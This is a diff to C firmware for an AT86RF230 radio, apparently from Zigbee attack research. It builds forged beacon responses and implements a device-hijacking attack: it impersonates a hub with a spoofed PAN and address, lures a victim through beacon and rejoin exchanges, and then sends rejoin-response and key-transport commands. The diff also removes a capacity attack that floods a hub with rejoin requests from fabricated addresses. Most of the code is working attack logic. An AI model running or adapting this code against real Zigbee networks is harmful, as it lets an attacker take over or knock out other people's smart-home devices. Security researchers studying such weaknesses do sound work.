@@ -17,13 +17,11 @@ unsigned char length = 0;
 uint16_t FCF = 0;
 unsigned char seqno = 0;
 unsigned char cmd = 0;
+
+
 /********  Transciver Library ********/
-/**
- * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
- * @note   
- * @param  aack_config: Config used to set RX_AACK
- * @retval None
- */
+
+
 void set_rx_aack(rx_aack_config* aack_config)
 {
 	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
@@ -88,28 +86,34 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
 				   rx_aack_config* aack_config)
 {
+	led(1);
+	DELAY_1;
 	uint8_t reg_status = 0;
-	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
 	change_state(TRX_CMD_FORCE_PLL_ON);
 	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON) {
 		_delay_us(REG_CHANGE_DELAY);
 	}
-	// 2: Send Packets
+
 	spi_begin();
 	spi_send(AT86RF230_BUF_WRITE);
 	// Finally we applied hard-coded methods.
 	switch (command) {
-		case ZBEE_MAC_CMD_DATA_RQ :
+		case ZBEE_MAC_CMD_DATA_RQ:
 			send_data_request(security, dst_addr, src_addr);
 			break;
 		case ZBEE_NWK_CMD_REJOIN_RQ :
 			send_rejoin_request(security, dst_addr, src_addr);
 			break;
+		case ZBEE_MAC_CMD_BEACON_RP :
+			send_beacon_response(security, dst_addr, src_addr);
+			break;
+		case ZBEE_APS_CMD_KEY_TRANSPORT :
+			// send_transport_key(security, dst_addr, src_addr);
+			break;
 		default :
 			break;
 	}
 	spi_end();
-	// 3: Send the packet
 	change_state(TRX_STATUS_TX_ARET_ON);
 	while(reg_status != TRX_STATUS_TX_ARET_ON)
 	{
@@ -117,7 +121,7 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		_delay_us(REG_CHANGE_DELAY);
 	}
 	slp_tr();
-	// 4: Determine and configure the afterwards transciver mode
+
 	if (aack_config->aack_flag)
 	{
 		set_rx_aack(aack_config);
@@ -128,6 +132,8 @@ void send_zbee_cmd(uint8_t command, uint8_t security,
 		change_state(TRX_CMD_RX_ON);
 		// change_state(TRX_CMD_PLL_ON);
 	}
+	led(0);
+	DELAY_1;
 }
 
 static uint8_t spi_send_blocks(void *data, uint8_t size)
@@ -141,10 +147,10 @@ static uint8_t spi_send_blocks(void *data, uint8_t size)
 	assert(byte_count == size);
 	return byte_count;
 }
+
 /********  END of Transciver Library *******/
 
 /********  Command Library *******/
-// NWK Layer Command
 void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
 {
 	count = 0;
@@ -163,7 +169,44 @@ void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_a
 
 	assert(count == length - 1);
 }
-// NWK Layer Command
+void send_beacon_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
+{
+	count = 0;
+	length = 26 + 2;
+	FCF = 0x8000;		
+	seqno = 0xff;
+	uint16_t super_frame = 0x0fff;
+	if(src_addr->coordinator_flag)
+	{
+		super_frame = 0x4fff;
+	}
+	uint8_t GTS = 0x00;
+	uint8_t pending = 0x00;
+	uint8_t proto = 0x00;
+	uint16_t beacon_field = 0x8422;
+	unsigned char offset[] = {0xff, 0xff, 0xff};
+	uint8_t update_id = src_addr->beacon_update_id;
+
+	count += spi_send_blocks(&length, sizeof(length));
+	
+	// MAC Layer
+	count += spi_send_blocks(&FCF, sizeof(FCF));
+	count += spi_send_blocks(&seqno, sizeof(seqno));
+	count += spi_send_blocks(&src_addr->pan, sizeof(src_addr->pan));
+	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
+	count += spi_send_blocks(&super_frame, sizeof(super_frame));
+
+	// Beacon Payload
+	count += spi_send_blocks(&GTS, sizeof(GTS));
+	count += spi_send_blocks(&pending, sizeof(pending));
+	count += spi_send_blocks(&proto, sizeof(proto));
+	count += spi_send_blocks(&beacon_field, sizeof(beacon_field));
+	count += spi_send_blocks(&src_addr->epan, sizeof(src_addr->epan));
+	count += spi_send_blocks(offset, sizeof(offset));
+	count += spi_send_blocks(&update_id, sizeof(update_id));
+
+	assert(count == length - 1);
+}
 void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
 {
 	count = 0;
@@ -213,7 +256,13 @@ void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154
 
 }
 /********  END of Command Library *******/
+
 /********  Attack-Specific Functions *******/
+uint8_t capacity_attack(ieee802154_addr* hub_addr, uint64_t random_addr, uint8_t type)
+{
+	// Please check attack_12.c
+	return 0;
+}
 uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
 {
 	// Please check attack_13.c
@@ -221,63 +270,49 @@ uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, 
 }
 uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
 {
-	// Please check attac_14.c
-	return 0;
-}
-/**
- * @brief  Implement the first attack: Capacity Attack
- * @note   
- * @param  dst_addr:  The target hub's information.
- * @param  random_addr
- * @param  type: type = 2; ZED;	type = 1: ZR; type = 0: ZC
- * @retval 1 if succeed; 0 if the number of sent TC rejoin request exceeds the bound.
- */
-uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t type)
-{
-	int32_t trial_count = 0;
-	ieee802154_addr ghost_addr = *dst_addr;
-	ghost_addr.short_addr  = 0x1234;
-	ghost_addr.long_addr = random_addr;
-	ghost_addr.device_type = type;
-	ghost_addr.rx_when_idle = 1;
-	if (type == 2)
-	{
-		// Pretend to be Sleepy End Device
-		ghost_addr.rx_when_idle = 0;
-	}
+	ieee802154_addr fake_hub_addr = *hub_addr;
+	fake_hub_addr.pan = 0x7051;
+	fake_hub_addr.short_addr = hub_addr->short_addr + 0x0001;
 	rx_aack_config aack_config = {};
-	aack_config.aack_flag = 1;
+	aack_config.aack_flag = 0;
 	aack_config.dis_ack = 0;
 	aack_config.pending = 0;
-	aack_config.target_short_addr.addr = ghost_addr.short_addr;
-	aack_config.target_pan_id.addr = ghost_addr.pan;
-	// The rejoin_full_flag is modified in processing_incoming_packets()
-	while(!rejoin_full_flag)
+	aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
+	aack_config.target_pan_id.addr = fake_hub_addr.pan;
+	// Detect TC rejoin request and Data Request, and turn on AACK
+	tc_rejoin_request_flag = 0;
+	while(!beacon_request_flag)
 	{
-		led(1);
-		DELAY_1;
-		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, dst_addr, &ghost_addr, &aack_config);
-		if (type == 2)
-		{
-			// Send Data Request
-			_delay_us(100);
-			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, dst_addr, &ghost_addr, &aack_config);
-		}
-		// Delay for a preiod
-		_delay_ms(REJOIN_REQUEST_INTERVAL);
-		trial_count += 1;
-		// Update the MAC address by adding 1.
-		ghost_addr.long_addr += 1;
-		ghost_addr.short_addr += 1;
-		aack_config.target_short_addr.addr = ghost_addr.short_addr;
-		// If too many trials have been done, then stop the capacility attack.
-		if (trial_count >= MAX_REJOIN_REQUEST_NUM) {
-			return 0;
-		}
-		led(0);
-		DELAY_1;
+		_delay_us(5);
 	}
+	send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
+	while(!tc_rejoin_request_flag)
+	{
+		// Detect Beacon Request and Reply with Beacon Response
+		beacon_request_flag = 0;
+		while(!beacon_request_flag)
+		{
+			_delay_us(5);
+		}
+		send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
+		// Wait for TC Rejoin Request
+		_delay_us(20);
+	}
+	aack_config.aack_flag = 1;
+	// 4. Detect Data Request and Send Rejoin Response Command.
+	data_request_flag = 0;
+	while(!data_request_flag)
+	{
+		_delay_us(50);
+	}
+	send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, victim_addr, &fake_hub_addr, &aack_config);
+	// 5. Detect Data Request and Send Transport Key Command.
+	data_request_flag = 0;
+	while(!data_request_flag)
+	{
+		_delay_us(50);
+	}
+	send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, victim_addr, &fake_hub_addr, &aack_config);
 	return 1;
 }
-
 /********  END of Attack-Specific Library *******/
